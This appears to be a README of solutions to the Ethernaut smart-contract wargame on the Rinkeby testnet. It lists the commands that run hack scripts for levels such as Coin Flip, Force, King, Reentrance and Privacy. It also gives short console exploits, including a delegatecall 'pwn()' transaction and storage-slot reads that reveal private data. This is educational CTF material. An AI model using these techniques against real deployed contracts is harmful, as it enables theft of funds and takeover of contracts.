# Ethernaut

## Coin Flip

Set up the `.env` file with your HTTP_ENDPOINT, PRIVATE_KEY and coin flip instance address.

```dotenv
PRIVATE_KEY="0x0000000000000000000000000000000000000000000000000000000000000000"
HTTP_ENDPOINT="https://eth-rinkeby.alchemyapi.io/v2/xxx"
COIN_FLIP_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/coin_flip_hack.js --network rinkeby
```

## Delegation

```js
await contract.sendTransaction({data: web3.eth.abi.encodeFunctionSignature("pwn()")})
```

## Force

Set your force contract address in `.env`.

```
FORCE_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/force_hack.js --network rinkeby
```

references:
- https://ethereum.stackexchange.com/questions/63987/can-a-contract-with-no-payable-function-have-ether/63988#63988
- https://solidity-by-example.org/hacks/self-destruct/ 

## Vault

Get the password with below command run in console.

```
await web3.eth.getStorageAt(instance, 1, console.log)
```

You can use [etherscan](https://rinkeby.etherscan.io) to run the `unlock` function.

## King

Set your king contract address in `.env`.

```
KING_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/king_hack.js --network rinkeby
```

## Reentrance

Set your reentrance contract address in `.env`.

```
REENTRANCE_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/reentrance_hack.js --network rinkeby
```

## Elevator

Set your elevator contract address in `.env`.

```
ELEVATOR_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/elevator_hack.js --network rinkeby
```

## Privacy

```solidity
contract Privacy {
  // slot 0
  bool public locked = true;
  // slot 1
  uint256 public ID = block.timestamp;
  // slot 2
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  // slot 3,4,5
  bytes32[3] private data;
}
```

Set your privacy contract address in `.env`.

```
PRIVACY_ADDR="0x0000000000000000000000000000000000000000"
```

run

```bash
npx hardhat run scripts/privacy_hack.js --network rinkeby
```

- https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html
- https://solidity-by-example.org/hacks/accessing-private-data/
- https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-sendtransaction

